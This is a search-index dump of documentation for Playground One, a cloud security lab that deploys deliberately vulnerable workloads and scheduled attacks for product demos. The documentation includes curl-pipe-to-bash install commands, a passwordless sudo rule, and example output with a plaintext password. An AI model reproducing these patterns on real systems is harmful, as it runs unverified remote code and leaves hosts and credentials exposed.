\"cluster.resourcesVpcConfig.clusterSecurityGroupId\"\n</code></pre> <pre><code># Example\nCluster security group id:\n\"sg-0a8c50569b529a3b3\"\n</code></pre> <p>CIS Controls:</p> <ul> <li>12.6 Use of Secure Network Management and Communication Protocols. Use secure network management and communication protocols (e.g., 802.1X, Wi-Fi Protected Access 2 (WPA2) Enterprise or greater).</li> <li>9.2 Ensure Only Approved Ports, Protocols and Services Are Running. Ensure that only network ports, protocols, and services listening on a system with validated business needs, are running on each system.</li> <li>9.4 Apply Host-based Firewalls or Port Filtering Apply host-based firewalls or port filtering tools on end systems, with a default-deny rule that drops all traffic except those services and ports that are explicitly allowed.</li> </ul> <p>Encrypt traffic to HTTPS load balancers with TLS certificates</p> <p>Encrypting traffic between users and your Kubernetes workload is fundamental to protecting data sent over the web.</p> <p>Audit:</p> <p>Your load balancer vendor can provide details on auditing the certificates and policies required to utilize TLS.</p> <p>CIS Controls:</p> <ul> <li>3.10 Encrypt Sensitive Data in Transit. Encrypt sensitive data in transit. Example implementations can include: Transport Layer Security (TLS) and Open Secure Shell (OpenSSH).</li> <li>14.4 Encrypt All Sensitive Information in Transit Encrypt all sensitive information in transit.</li> </ul>"},{"location":"security/#vision-one-container-security","title":"Vision One Container Security","text":"<p>The API key is used for communication with the backend throughout the life of the in-cluster app.</p> <p>The API key is generated when generating the cluster and copied to the <code>overrides.yaml</code>.</p> <p>Determine whether to use existing secrets in the target namespace rather than specifying in overrides.yaml. Useful if you want to manage secrets on your own, e.g., in argocd.</p> <p>When this is enabled, typically you will need these secrets created in your target namespace. (names may vary depending on your settings):</p> <ul> <li>trendmicro-container-security-auth</li> <li>trendmicro-container-security-outbound-proxy-credentials</li> </ul> <p>You can fill overrides.yaml and use helm install --dry-run to generate these secret's template.</p> <p>After deployment, if you update the secret after deployment, you will need to restart pods of container security to make changes take effect.</p> <p><code>useExistingSecrets: false</code></p>"},{"location":"getting-started/configuration/","title":"Getting Started Configuration","text":"<p>Playground One is controlled by the command line interface <code>pgo</code>.</p> <p>Use it to interact with the Playground One by running</p> <pre><code>pgo\n</code></pre> <p>from anywhere in your terminal.</p> <p>Note: If <code>pgo</code> is not found create a new shell to load the environment or run <code>. ~/.bashrc</code>.</p>"},{"location":"getting-started/configuration/#getting-help","title":"Getting Help","text":"<p>Run:</p> <pre><code>pgo --help\n</code></pre> <pre><code> __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\nUsage: pgo -&lt;command&gt; &lt;configuration&gt; ...\n\nThe available commands for execution are listed below.\nThe primary workflow commands are given first, followed by\nless common or more advanced commands.\n\nAvailable configurations: vpc, nw, ec2, eks-ec2, eks-fg, ecs, scenarios-ec2, scenarios-fg\n\nMain commands:\n  -c --config    Set/update Playground One main configuration\n  -i --init      Prepare a configuration for other commands\n  -a --apply     Create or update a configuration\n  -l --list      List applied configurations\n  -d --destroy   Destroy previously-created configuration\n  -o --output    Show output values\n  -s --state     Show the current state\n  -E --erase     Cleanup Terraform state\n  -h --help      Show this help\n\nOther commands:\n  -S --show      Show advanced state\n  -u --updateip  Update access IP(s)\n  -U --update    Update Playground One and components\n  -v --validate  Check whether the configuration is valid\n  -p --plan      Plan apply and destroy\n\nAvailable configurations:\n  nw             Network configuration (synonym: network)\n  ec2            EC2 configuration (synonym: instances)\n  eks-ec2        EKS configuration (synonym: eks)\n  eks-fg         EKS configuration\n  aks            AKS configuration\n  ecs            ECS configurations\n  kind           Kind configuration\n  scenarios-ec2  Scenario configuration (synonym: scenarios)\n  scenarios-fg   Scenario configuration\n  scenarios-aks  Scenario configuration\n  dsm            Deep Security configuration (synonym: deepsecurity)\n  dsw            Deep Security Workload configuration\n  all            All configurations\n\nExamples:\n  pgo --apply nw\n  pgo --state all\n</code></pre>"},{"location":"getting-started/configuration/#configure","title":"Configure","text":"<p>Note: When using AWS you need to know your Account ID, for Azure you need your Subscription ID. Get these IDs using the following commands:</p> <p><code>aws sts get-caller-identity | jq -r '.Account'</code></p> <p><code>az account list | jq -r '.[] | [.name, .id] | @tsv'</code></p> <p>After bootstrapping you need to configure Playground One. To simplify the process use the built in configuration tool. An eventually already existing <code>config.yaml</code> will be saved as <code>config.yaml.bak</code>. Run</p> <pre><code>pgo --config\n</code></pre> <p>This process will create or update your personal <code>config.yaml</code>. Eventually existing setting will be shown in square brackets. To accept them just press enter.</p> <p>The configuration tool is devided into sections. The following chapters walk you through the process.</p>"},{"location":"getting-started/configuration/#section-aws","title":"Section: AWS","text":"<p>Note: This section is skipped when you have any configuration applied.</p> <p>Set/update:</p> <ul> <li><code>AWS Account ID</code>: The ID of your AWS subscription (just numbers no <code>-</code>). This is mandatory.</li> <li><code>AWS Region Name</code>: If you want to use another region as <code>eu-central-1</code>.</li> </ul>"},{"location":"getting-started/configuration/#section-azure","title":"Section: Azure","text":"<p>Set/update:</p> <ul> <li><code>Azure Subscription ID</code>: The ID of your Azure subscription. This is mandatory.</li> <li><code>Azure Region Name</code>: If you want to use another region as <code>westeurope</code>.</li> </ul>"},{"location":"getting-started/configuration/#section-playground-one","title":"Section: Playground One","text":"<p>You don't necessarily need to change anything here if you're satisfied with the defaults, but</p> <p>Note: It is highly recommended to change the <code>Access IPs/CIDRs</code> to (a) single IP(s) or at least a small CIDR to prevent anonymous users playing with your environmnent. Remember: we might deploy vulnerable applications.</p> <p>Set/update:</p> <ul> <li><code>PGO Environment Name</code>: Your to be built environment name. It MUST NOT be longer than 12 characters.</li> <li><code>Access IPs/CIDRs</code>:</li> <li>If you're running on a local Ubuntu server or are using Playground One Container locally (not on Cloud9), get your public IP and set the value to <code>&lt;YOUR IP&gt;/32</code> or type <code>pub</code> and let the config tool detect your public IP.</li> <li>If you're working on a Cloud9 you need to enter a second public IP/CIDRs.<ol> <li>Public IP from your Cloud9 or type <code>pub</code>.</li> <li>Public IP from your local client.  </li> </ol> </li> <li>If you want someone else grant access to your environment just add another IP/CIDR.</li> <li>Examples:<ul> <li><code>pub</code></li> <li><code>pub, 86.120.222.205</code></li> <li><code>3.121.226.247/32, 86.120.222.20/32</code></li> <li><code>0.0.0.0/0</code> Dangerous!</li> </ul> </li> <li><code>EC2 - create Linux EC2</code>: Enable/disable Linux instances in the <code>ec2</code> configuration.</li> <li><code>EC2 - create Windows EC2</code>: Enable/disable Windows instances in the <code>ec2</code> configuration.</li> <li><code>RDS - create RDS Database</code>: Enable/disable creation of a RDS database</li> <li><code>ECS - utilize EC2 Nodes</code>: Enable/disable ECS cluster with EC2 nodes.</li> <li><code>ECS - utilize Fargate Nodes</code>: Enable/disable ECS cluster with Fargate nodes.</li> </ul> <p>If your IP address has changed see FAQ.</p>"},{"location":"getting-started/configuration/#section-vision-one-configuration","title":"Section: Vision One Configuration","text":"<p>Set/update:</p> <ul> <li><code>Vision One API Key</code>: Your Vision One API Key.</li> <li><code>Vision One Region Name</code>: Your Vision One Region.</li> <li><code>Vision One ASRM - create Potential Attack Path(s)</code>: Create potential attack path detections for ASRM.</li> <li><code>Vision One Container Security</code>: Enable or disable the Container Security deployment. If set to <code>false</code> Cloud One configuration will be skipped.</li> <li><code>Container Security Policy Name</code>: The name of the Policy to assign.</li> </ul>"},{"location":"getting-started/configuration/#section-integrations-configuration","title":"Section: Integrations Configuration","text":"<p>Set/update:</p> <ul> <li><code>Calico</code>: Enable/disable the most used Pod network on your EKS cluster. It's currently disabled by default but will come shortly</li> <li><code>Prometheus &amp; Grafana</code>: Enable/disable Prometheus. It is an open-source systems monitoring and alerting toolkit integrated with a preconfigured Grafana.</li> <li><code>Trivy</code>: Enable/disable Trivy vulnerability scanning for comparison.</li> <li><code>MetalLB</code>: Enable/disable MetalLB for Kind cluster.</li> </ul>"},{"location":"getting-started/configuration/#section-deep-security","title":"Section: Deep Security","text":"<p>Set/update:</p> <ul> <li><code>Deep Security</code>: Enable or disable the Deep Security deployment. If set to <code>false</code> Deep Security configuration will be skipped.</li> <li><code>Deep Security License</code>: Your Deep Security license key.</li> <li><code>Deep Security Username</code>: Username of the MasterAdmin.</li> <li><code>Deep Security Password</code>: Password of the MasterAdmin.</li> </ul> <p>Now, continue with the chapter General Life-Cycle.</p>"},{"location":"getting-started/life-cycle/","title":"General Life-Cycle","text":""},{"location":"getting-started/life-cycle/#initialize","title":"Initialize","text":"<p>Initialize with</p> <pre><code>pgo --init all\n</code></pre> <p>This will prepare all available configurations. No changes done in the clouds yet.</p> <p>If you have changed Playground Ones main configuration using <code>pgo --config</code> or updated it via <code>git pull</code> please rerun <code>pgo --init all</code> again to apply eventual changes to the configurations.</p>"},{"location":"getting-started/life-cycle/#create-the-aws-environment","title":"Create the AWS Environment","text":"<ol> <li> <p>To create the VPC and Network run</p> <pre><code>pgo --apply nw\n</code></pre> <p>This will create your VPC and network in the configured region (see <code>config.yaml</code>)</p> </li> <li> <p>If you want your EC2 instances to be connected to Vision One Endpoint Security head over to Vision One Endpoint Security Server &amp; Workload Protection and come back afterwards.</p> </li> <li> <p>Create Virtual Instances and/or Kubernetes Clusters with demo workload.</p> <p>EC2 instances:</p> <pre><code>pgo --apply ec2\n</code></pre> <p>EKS EC2 cluster:</p> <pre><code>pgo --apply eks-ec2\n</code></pre> <p>EKS Fargate cluster:</p> <pre><code>pgo --apply eks-fg\n</code></pre> <p>ECS cluster(s):</p> <pre><code>pgo --apply ecs\n</code></pre> </li> <li> <p>Create a dedicated (on-prem like) Deep Security environment with activated Computers.</p> <p>VPC and Deep Security:</p> <pre><code>pgo --apply dsm\n</code></pre> <p>Activated Linux &amp; Windows Computers:</p> <pre><code>pgo --apply dsw\n</code></pre> </li> </ol>"},{"location":"getting-started/life-cycle/#create-the-azure-environment","title":"Create the Azure Environment","text":"<ol> <li> <p>Create Kubernetes Cluster with demo workload.</p> <p>AKS cluster:</p> <pre><code>pgo --apply aks\n</code></pre> </li> </ol>"},{"location":"getting-started/life-cycle/#query-outputs-and-state","title":"Query Outputs and State","text":"<p>The most relevant information on your configuration can be queried by running</p> <pre><code>pgo --output &lt;configuration&gt;\n</code></pre> <p>Example: <code>pgo --output ec2</code>:</p> <pre><code>public_instance_id_db1 = \"i-072abd953dedaae5d\"\npublic_instance_id_srv1 = \"i-0f2c91e08fd054510\"\npublic_instance_id_web1 = \"i-048ecedf660236f47\"\npublic_instance_ip_db1 = \"3.76.39.227\"\npublic_instance_ip_srv1 = \"3.75.219.198\"\npublic_instance_ip_web1 = \"18.197.106.33\"\npublic_instance_password_srv1 = &lt;sensitive&gt;\ns3_bucket = \"playground-awsone-cesh306v\"\nssh_instance_db1 = \"ssh -i ../playground-key-pair.pem -o StrictHostKeyChecking=no ubuntu@3.76.39.227\"\nssh_instance_srv1 = \"ssh -i ../playground-key-pair.pem -o StrictHostKeyChecking=no admin@3.75.219.198\"\nssh_instance_web1 = \"ssh -i ../playground-key-pair.pem -o StrictHostKeyChecking=no ubuntu@18.197.106.33\"\npublic_instance_password_srv1 = \"4h1v}Q7Hc9tbGWdM\"\n</code></pre> <p>With this you can always query how to connect to your running EC2 instances. All instances support SSH connections, the Windows Server Remote Desktop as well. For RDP Use the configured <code>admin</code> user, the ip address and password for srv1.</p>"},{"location":"getting-started/life-cycle/#play-with-the-playground-one","title":"Play with the Playground One","text":"<p>It's a playground, or? Experiment and hopefully learn a few things. For your guidance, there are some prepared scenarios for you to go through. Find them in the navigation pane.</p>"},{"location":"getting-started/life-cycle/#switch-in-between-multiple-kubernetes-clusters","title":"Switch in between multiple Kubernetes Clusters","text":"<p>If you're using multiple clusters simultaneously you can easily switch in between the clusters using the command <code>kubie</code>.</p> <p>Main commands:</p> <ul> <li><code>kubie ctx</code> display a selectable menu of contexts or directly spawns a shell if there is only one context available.</li> <li><code>kubie ctx &lt;context&gt;</code> switch the current shell to the given context (spawns a shell if not a kubie shell).</li> <li><code>kubie ctx -</code> switch back to the previous context</li> <li><code>kubie ns</code> display a selectable menu of namespaces</li> <li><code>kubie ns &lt;namespace&gt;</code> switch the current shell to the given namespace</li> <li><code>kubie ns -</code> switch back to the previous namespace</li> </ul> <p>Exit a context by pressing <code>^d</code>.</p> <p>Full list of kubie commands here.</p>"},{"location":"getting-started/life-cycle/#tear-down","title":"Tear Down","text":"<p>If you want to destroy your environment completely or only parts of it</p> <pre><code>pgo --destroy &lt;configuration&gt;\n</code></pre> <p>If you want to tear down everything run</p> <pre><code>pgo --destroy all\n</code></pre> <p>Note: The network and VPC are not automatically destroyed. You can do this manually by running <code>pgo --destroy nw</code>. Be sure to have the CloudFormation stack of XDR for Containers deleted before doing so. Otherwise it will be in a failed (blackhole) state.</p>"},{"location":"getting-started/prepare/","title":"Getting Started","text":"<p>There are multiple ways to prepare Playground One:</p> <ul> <li>The Playground One Container, or</li> <li>the native use on your system.</li> </ul> <p>The Playground One Container runs on <code>arm64</code>  or <code>amd64</code> machines providing a container engine like Docker, Docker Desktop or Colima to run the container. It is the most simple way to use. The container contains everything what is needed by the Playground One to operate and does not change your local system in any way.</p> <p>Running Playground One natively allows you to have all components available system wide. This makes it possible to not only manage an environment implemented by Playground One.</p>"},{"location":"getting-started/prepare/#playground-one-container-easy-and-portable","title":"Playground One Container (Easy and portable)","text":"<p>Follow this chapter if...</p> <ul> <li>you intent to use Playground One Container on any <code>arm64</code>  or <code>amd64</code> based container engine. This includes AWS Cloud9 environments with Amazon Linux or Ubuntu.</li> </ul> <p>Note: For the curious ones, here's the Dockerfile.</p> <p>First, start a terminal and ensure to have a running container engine, eventually run <code>docker ps</code> to verify this.</p> <p>Note: If you want to specify a Playground One Container version instead of using <code>latest</code> create a file with the version (tag) to use by running:</p> <p><code>echo \"&lt;VERSION&gt;\" &gt;.PGO_VERSION</code></p> <p>Example:</p> <p><code>echo \"0.2\" &gt;.PGO_VERSION</code></p> <p>Then simply run</p> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/get_pgoc.sh | bash\n</code></pre> <p>The above will pull the latest version (or the version you specified in the <code>.PGO_VERSION</code>-file) of the container. If you're already authenticated to AWS, Azure, and/or have an already existing <code>config.yaml</code> from a previous Playground One installation in the current directory, they will automatically be made available to the Playground One container.</p> <p>Note: When running the above <code>curl</code>-command on an AWS Cloud9 instance, the instance should be at least a <code>t3.medium</code> and you will be asked to run <code>./get_pgoc.sh</code> manually. The script will ask for your AWS credentials which will never be stored on disk and get removed from memory after creating and assigning an instance role to the Cloud9 instance.</p> <p>If you didn't do before, you will be asked to turn off AWS managed temporary credentials: </p> <ul> <li>Click the gear icon (in top right corner), or click to open a new tab and choose <code>[Open Preferences]</code></li> <li>Select AWS SETTINGS</li> <li>Turn OFF <code>[AWS managed temporary credentials]</code></li> </ul> <p>You will notice, that a new directory called <code>workdir</code> has been created. This directory represents the <code>home</code>-directory from your Playground One Container.</p> <p>To access the container run</p> <pre><code>./pgoc start\n# password: pgo\n</code></pre> <pre><code>Starting Playground One Container\ncd741d37446ee0565f6da3f224eb60e4d3bab9824d3255ae08afef8b4263b2c9\n\nConnect:  ssh -p 2222 pgo@localhost\nPassword: pgo\npgo@localhost's password: \nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.1.72-96.166.amzn2023.x86_64 x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the 'unminimize' command.\n ____  _                                             _    ___             \n|  _ \\| | __ _ _   _  __ _ _ __ ___  _   _ _ __   __| |  / _ \\ _ __   ___ \n| |_) | |/ _` | | | |/ _` | '__/ _ \\| | | | '_ \\ / _` | | | | | '_ \\ / _ \\\n|  __/| | (_| | |_| | (_| | | | (_) | |_| | | | | (_| | | |_| | | | |  __/\n|_|   |_|\\__,_|\\__, |\\__, |_|  \\___/ \\__,_|_| |_|\\__,_|  \\___/|_| |_|\\___|\n               |___/ |___/                                                \npgo@cd741d37446e:~$ \n</code></pre> <p>If you exited the container, reconnect anytime with</p> <pre><code>ssh -p 2222 pgo@localhost\n# password: pgo\n</code></pre> <p>Eventually authenticate to AWS and/or Azure by either running</p> <pre><code># Not required when using Cloud9\naws configure\n</code></pre> <p>and/or</p> <pre><code>az login --use-device-code\n</code></pre> <p>Stopping the container is possible with <code>./pgoc stop</code>, to start it again just run <code>./pgoc start</code>.</p> <p>Note: Updating the container or changing to a different release of the container can be done following these steps:</p> <ol> <li>Edit the file <code>.PGO_VERSION</code> to set the version you want (e.g. <code>0.2</code>).</li> <li>Run <code>./pgoc update</code></li> <li>This will backup your current <code>workdir</code> and save your <code>config.yaml</code>.</li> <li>The desired version of the container is pulled and a new <code>workdir</code> is created.</li> <li>The previous <code>config.yaml</code> is restored alongside the eventually existing <code>.aws</code> config.</li> <li>Start the new container with <code>./pgoc start</code> and login via ssh.</li> </ol> <p>You likely get an error when connecting with ssh. If so, delete the offending line in <code>~/.ssh/known_hosts</code> and retry.</p> <p>Then, continue with Configuration.</p>"},{"location":"getting-started/prepare/#advanced-but-native","title":"Advanced but native","text":""},{"location":"getting-started/prepare/#ubuntu","title":"Ubuntu","text":"<p>Follow this chapter if...</p> <ul> <li>you're using the Playground on a Ubuntu machine (not Cloud9).</li> </ul> <p>Test if <code>sudo</code> requires a password by running <code>sudo ls /etc</code>. If you don't get a password prompt you're fine, otherwise run.</p> <pre><code>sudo visudo -f /etc/sudoers.d/custom-users\n</code></pre> <p>Add the following line:</p> <pre><code>&lt;YOUR USER NAME&gt; ALL=(ALL) NOPASSWD:ALL \n</code></pre> <p>Now, run the Playground</p> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/pgo | bash &amp;&amp; exit\n</code></pre> <p>The bootstrapping process will exit your current terminal or shell after it has done it's work. Depending on your environment just create a new terminal session.</p> <p>You now need to manually authenticate to AWS and/or Azure by either running</p> <pre><code>aws configure\n</code></pre> <p>and/or</p> <pre><code>az login --use-device-code\n</code></pre> <p>Then, continue with Configuration.</p>"},{"location":"getting-started/prepare/#experimental-macos-apple-silicon-and-intel","title":"EXPERIMENTAL - MacOS Apple silicon and Intel","text":"<p>Follow this chapter if...</p> <ul> <li>you're using the Playground on a MacOS machine with an M1+ (ARM) or Intel chip.</li> </ul> <p>Note: The initial bootstrapping process might require administrative privileges. Depending on your OS configuration you might need to enable administrator mode. Updating an already installed Playground does not require admin privileges.</p> <p>Now, run the Playground</p> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/pgo | bash &amp;&amp; exit\n</code></pre> <p>The bootstrapping process will exit your current terminal or shell after it has done it's work. Depending on your environment just create a new terminal session.</p> <p>You now need to manually authenticate to AWS and/or Azure by either running</p> <pre><code>aws configure\n</code></pre> <p>and/or</p> <pre><code>az login --use-device-code\n</code></pre> <p>Then, continue with Configuration.</p>"},{"location":"getting-started/prepare/#cloud9","title":"Cloud9","text":"<p>Note: Native installation on Cloud9 is no longer supported. Use Playground One Container (Easy and portable) instead.</p>"},{"location":"how-it-works/add-ons/","title":"Playground One Add-Ons","text":"<p>There are currently two not Terraform related add-ons included in the Playground One.</p> <ul> <li> <p>Cloud Security Posture Management</p> </li> <li> <p>Located in the Playground One home directury as <code>cspm</code>.</p> </li> <li> <p>The intention of this add-on is to provide a RESTful Api driven exception handling mechanism with Terraform template scanning support. The Python scripts included here implement the following functionality:</p> <ul> <li>Create Terrafrom Plan of Configuration and run Conformity Template Scan</li> <li>Set Exceptions in Scan Profile based on Name-Tags or unique Tags assigned to the resource</li> <li>Create Terraform Apply of Configuration</li> <li>Create Terraform Destroy of Configuration</li> <li>Remove Exceptions in Scan Profile or reset the Scan Profile</li> <li>Suppress Findings in Account Profile</li> <li>Expire Findings in Account Profile</li> <li>Run Conformity Bot and request status</li> <li>Download latest Report</li> </ul> </li> <li> <p>Consult the documentation within the Python scripts <code>scanner_c1_uuid.py</code> and/or <code>scanner_c1_name.py</code> on how to play with this.</p> </li> <li> <p>Container Stacks for Third-Party integrations.</p> </li> <li> <p>Located in the Playground One home directury as <code>stacks</code>.</p> </li> <li> <p>Splunk - Spins up a local Splunk which can be used individually or in conjunction with some scenarios of Playground One. These are</p> <ul> <li>Setup Splunk</li> <li>Integrate Vision One with Splunk</li> <li>Integrate V1CS Customer Runtime Security Rules with Splunk</li> <li></li> </ul> </li> <li> <p>Elastic - Creates a local ELK stack to play with.</p> <ul> <li>Setup Elastic (ELK Stack)</li> <li></li> </ul> </li> </ul>"},{"location":"how-it-works/configurations-aws/","title":"Playground One AWS Configurations","text":"<p>The Playground One has a modular structure as shown in the following tree:</p> <pre><code>awsone\n\u251c\u2500\u2500 network (2-network)\n|\u00a0\u00a0 \u251c\u2500\u2500 ec2 (3-instances)\n|\u00a0\u00a0 \u251c\u2500\u2500 eks (4-cluster-eks-ec2)\n|\u00a0\u00a0 |   \u251c\u2500\u2500 eks-deployments (8-cluster-eks-ec2-deployments)\n|\u00a0\u00a0 |   \u2514\u2500\u2500 scenarios (7-scenarios-ec2)\n|\u00a0\u00a0 \u251c\u2500\u2500 eks (4-cluster-eks-fargate)\n|\u00a0\u00a0 |   \u251c\u2500\u2500 eks-deployments (8-cluster-eks-fargate-deployments)\n|\u00a0\u00a0 |   \u2514\u2500\u2500 scenarios (7-scenarios-fargate)\n|   \u2514\u2500\u2500 ecs (5-cluster-ecs)\n\u251c\u2500\u2500 s3scanner (6-bucket-scanner)\n\u2514\u2500\u2500 dsm (9-deep-security)\n    \u2514\u2500\u2500 workload (9-deep-security-workload) \n</code></pre> <p>As we can see, the configuration <code>network</code> is the base for the other configurations. It creates the VPC, Subnets, Route Tables, Security Groups, etc. One can choose to only create the EKS cluster, or ECS cluster, or even the full stack. Everything will reside in the same VPC.</p> <p>The following chapters describe the different configurations on a high level, refer the the dedicated documentation for more details.</p>"},{"location":"how-it-works/configurations-aws/#virtual-private-cloud-and-network","title":"Virtual Private Cloud and Network","text":"<p>Configuration located in <code>awsone/2-network</code></p> <p>This configuration defines a network with the most commonly used architecture, private and public subnets accross three availability zones. It includes everything what a VPC should have, this is amongst others an internet gateway, NAT gateway, security groups, etc. Since a VPC is cheap there's no real need to destroy the networking configuration everyday, just leave it as it is and reuse it the next time. This eases the handling of other components.</p> <p>In addition to the networking things the following central services can be deployed optionally:</p> <ul> <li>Active Directory including a Certification Authority: An AD the PGO way based on cheap <code>t2.micro</code> instances.</li> <li>AWS Managed Active Directory: The AWS native variant. This is more on the expensive side (USD 96.48/mo).</li> <li>Trend Service Gateway. The configured and recommended instance type <code>c5.2xlarge</code> (8 vCPU, 16GiB, 10 Gigabit) is 0.388 USD/h, just to note.</li> </ul>"},{"location":"how-it-works/configurations-aws/#virtual-instances","title":"Virtual Instances","text":"<p>Configuration located in <code>awsone/3-instances</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>Basically, a couple of EC2 instances are created with this configuration. Currently these are two linux and one windows instances. One of the linux instances can be used to demo a potential attack path to RDS.</p> <p>If you store the agent installers for Server and Workload Security in <code>0-files</code> the instances will connect to Vision One.</p> <p>You can optionally drop any file or installer in the <code>0-files</code> directory which will then be available in the ec2 instances download folder.</p>"},{"location":"how-it-works/configurations-aws/#eks-ec2-cluster","title":"EKS EC2 Cluster","text":"<p>Configuration located in <code>awsone/4-cluster-eks-ec2</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>So, this is my favorite part. This configuration creates an EKS cluster with some nice key features:</p> <ul> <li>Autoscaling from 1 to 10 nodes</li> <li>Nodes running as Spot instances to save money :-)</li> <li>ALB Load Balancer controller</li> <li>Kubernetes Autoscaler</li> <li>Cluster is located in the private subnets</li> </ul>"},{"location":"how-it-works/configurations-aws/#cluster-deployments","title":"Cluster Deployments","text":"<p>Configuration located in <code>awsone/8-cluster-ec2-deployments</code></p> <p>Depends on <code>awsone/4-cluster-eks-ec2</code></p> <p>Currently, the following deployments are defined:</p> <ul> <li>Container Security</li> <li>Calico</li> <li>Prometheus &amp; Grafana</li> <li>Trivy</li> </ul>"},{"location":"how-it-works/configurations-aws/#scenarios","title":"Scenarios","text":"<p>Configuration located in <code>awsone/7-scenarios-ec2</code></p> <p>Depends on <code>awsone/4-cluster-eks-ec2</code></p> <p>Currently, the following (vulnerable) deployments are defined:</p> <ul> <li>WebApp System-Monitor (see Escape to the Host System)</li> <li>WebApp Health-Check (see ContainerD Abuse)</li> <li>WebApp Hunger-Check (see Hunger Check)</li> <li>Java-Goof</li> <li>Nginx</li> </ul> <p>Automated attacks are running every full hour.</p>"},{"location":"how-it-works/configurations-aws/#eks-fargate-cluster","title":"EKS Fargate Cluster","text":"<p>Configuration located in <code>awsone/4-cluster-eks-fargate</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>This configuration creates a Fargate EKS cluster with some nice key features:</p> <ul> <li>Fargate Profiles</li> <li>Nodes running as Spot instances to save money :-)</li> <li>An additional AWS managed node group</li> <li>Cluster is located in the private subnets</li> </ul>"},{"location":"how-it-works/configurations-aws/#cluster-deployments_1","title":"Cluster Deployments","text":"<p>Configuration located in <code>awsone/8-cluster-fargate-deployments</code></p> <p>Depends on <code>awsone/4-cluster-eks-fargate</code></p> <p>Currently, the following deployments are defined:</p> <ul> <li>Container Security</li> <li>Calico</li> </ul>"},{"location":"how-it-works/configurations-aws/#scenarios_1","title":"Scenarios","text":"<p>Configuration located in <code>awsone/7-scenarios-fargate</code></p> <p>Depends on <code>awsone/4-cluster-eks-fargate</code></p> <p>Currently, the following (vulnerable) deployments are defined:</p> <ul> <li>Java-Goof</li> <li>Nginx</li> </ul> <p>Automated attacks are running every full hour.</p>"},{"location":"how-it-works/configurations-aws/#ecs-clusters","title":"ECS Clusters","text":"<p>Configuration located in <code>awsone/5-cluster-ecs</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>Here we're building an ECS cluster using EC2 instances and/or Fargate profile. Key features:</p> <ul> <li>Autoscaling group for spot instances when using the EC2 variant. On-demand autoscaler can be enabled in Terraform script.</li> <li>Fargate profile with spot instances. Fargate with on-demand instances can be enabled in Terraform script.</li> <li>ALB Load Balancer</li> <li>Automatic deployment of a vulnerable service (Java-Goof)</li> </ul>"},{"location":"how-it-works/configurations-aws/#s3-bucket-scanner","title":"S3 Bucket Scanner","text":"<p>Configuration located in <code>awsone/6-bucket-scanner</code></p> <p>Simple S3 Bucket scanner using the File Security Python SDK within a Lambda Function. Scan results will show up on the Vision One console.</p>"},{"location":"how-it-works/configurations-aws/#deep-security","title":"Deep Security","text":"<p>Configuration located in <code>awsone/9-deep-security</code> and <code>awsone/9-deep-security-workload</code></p> <p>This configuration is to simulate an on-premise Deep Security environment meant to be used in integration and migration scenarios. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. It includes everything what a VPC should have, this is amongst others an internet gateway, NAT gateway, security groups, etc.</p> <p>The workload configuration creates a demo configuration for Deep Security and two custom policies. Two linux and one windows instances are created and activated with Deep Security. Some minutes after instance creation the activated computers will run a recommendation scan.</p> <p>Check the Scenarios section to see available integration and migration scenarios.</p>"},{"location":"how-it-works/configurations-aws/#instance-types-in-use-as-of-062024","title":"Instance Types in Use as of 06/20/24","text":"<p>Region: <code>eu-central-1</code></p> Instance name On-Demand hourly rate vCPU Memory Storage Network performance Configuration t2.micro $0.0134 1 1 GiB EBS Only Low to Moderate Deep Security Bastion t3.medium $0.048 2 4 GiB EBS Only Up to 5 Gigabit Various t3.xlarge $0.192 4 16 GiB EBS Only Up to 5 Gigabit Deep Security Manager c5.2xlarge $0.388 8 16 GiB EBS Only Up to 10 Gigabit Service Gateway"},{"location":"how-it-works/configurations-azure/","title":"Playground One Azure Configurations","text":"<p>The Playground One has a modular structure as shown in the following tree:</p> <pre><code>azone\n\u2514\u2500\u2500 aks (4-cluster-aks)\n    \u251c\u2500\u2500 aks-deployments (8-cluster-aks-deployments)\n \u00a0\u00a0 \u2514\u2500\u2500 scenarios (7-scenarios-aks)\n</code></pre> <p>The following chapters describe the different configurations on a high level, refer the the dedicated documentation for more details.</p>"},{"location":"how-it-works/configurations-azure/#aks-cluster","title":"AKS Cluster","text":"<p>Configuration located in <code>azone/4-cluster-aks</code></p> <p>This configuration creates a Fargate EKS cluster with some nice key features:</p> <ul> <li>Azure Application Gateway as a web traffic (OSI layer 7) load balancer.</li> <li>Autoscaling</li> </ul>"},{"location":"how-it-works/configurations-azure/#cluster-deployments","title":"Cluster Deployments","text":"<p>Configuration located in <code>azone/8-cluster-aks-deployments</code></p> <p>Depends on <code>azone/4-cluster-aks</code></p> <p>Currently, the following deployments are defined:</p> <ul> <li>Container Security</li> <li>Calico</li> <li>Prometheus &amp; Grafana</li> <li>Trivy</li> </ul> <p>Automated attacks are running every full hour.</p>"},{"location":"how-it-works/configurations-azure/#scenarios","title":"Scenarios","text":"<p>Configuration located in <code>azone/7-scenarios-aks</code></p> <p>Depends on <code>azone/4-cluster-aks</code></p> <p>Currently, the following (vulnerable) deployments are defined:</p> <ul> <li>Java-Goof</li> <li>Nginx</li> </ul> <p>Automated attacks are running every full hour.</p>"},{"location":"how-it-works/configurations-kind/","title":"Playground One Kind Configurations","text":"<p>The Playground One has a modular structure as shown in the following tree:</p> <pre><code>kindone\n\u2514\u2500\u2500 kind (4-cluster-kind)\n    \u251c\u2500\u2500 kind-deployments (8-cluster-kind-deployments)\n    \u2514\u2500\u2500 scenarios (7-scenarios-kind)\n</code></pre> <p>The following chapters describe the different configurations on a high level, refer the the dedicated documentation for more details.</p>"},{"location":"how-it-works/configurations-kind/#kind-cluster","title":"Kind Cluster","text":"<p>Configuration located in 